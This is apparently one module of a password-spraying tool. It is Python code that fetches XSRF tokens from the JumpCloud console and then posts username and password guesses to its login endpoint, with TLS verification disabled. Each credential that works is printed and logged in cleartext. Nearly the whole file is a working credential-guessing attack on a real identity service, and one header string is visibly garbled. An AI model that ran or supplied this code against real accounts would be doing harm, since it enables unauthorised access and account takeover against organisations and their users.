#!/usr/bin/env python3

import requests
import warnings
# This is to suppress the insecure warning. If there is a better way please let me know
from requests.packages.urllib3.exceptions import InsecureRequestWarning

warnings.simplefilter('ignore',InsecureRequestWarning)

'''Function to password guess against jumpcloud console. Completely stole the idea from
dru1d and stumblebot'''
def jump_conn(params):

    username = params.get("username")
    password = params.get("password")
    count = params.get("count")
    place = params.get("place")
    filelogger = params.get("filelogger")
    jmpurl = ''.join(params.get("host"))
    target = 'console.jumpcloud.com'
    xsrf = params.get('xsrf')
    xsrftoken = params.get('xsrftoken')

    headers = {
        'Host': 'console.jumpcloud.com',
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Geckopplication/json',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'application/json',
        'X-Xsrftoken': xsrftoken,
        'Content-Length': '61',
        'Origin': 'https://console.jumpcloud.com',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Referer': 'https://console.jumpcloud.com/login',
    }

    cookies = {'jc_prevLoginType': 'user',
               '_xsrf': xsrf}
    data = {'email': username, 'password': password}
    try:

        # print the host , username and password being checked
        print(f"ACCOUNT CHECK: [JumpCloud] Target: {target} User: {username} [{place} of {count}, {place} completed] Password: {password}")

        query = requests.post(
            jmpurl, json=data, headers=headers, cookies=cookies, verify=False)
        if query.status_code == 200:
            print(f"ACCOUNT FOUND: [JumpCloud] Target: {target} User: {username} Password: {password} [SUCCESS]")
            if filelogger != None:
                filelogger.debug(f"ACCOUNT FOUND: [JumpCloud] Target: {target} User: {username} Password: {password} [SUCCESS]")
        elif query.status_code != 401:
            print(f"The Header Respose code to investigate: {query.status_code}")

    except:
        pass

'''Need to run this function once before spraying jumpcloud to get the xsrf token values.
Without these values a 403 is returned'''
def get_tokens():

    tokenurl = 'https://console.jumpcloud.com/userconsole/xsrf'

    tokenreq = requests.get(tokenurl)
    cookieparse = vars(tokenreq.cookies)
    xsrfconv = vars(cookieparse['_cookies']
                    ['console.jumpcloud.com']['/']['_xsrf'])
    xsrf = xsrfconv['value']
    xsrftoken = tokenreq.text.split('"')[3]

    return xsrf, xsrftoken
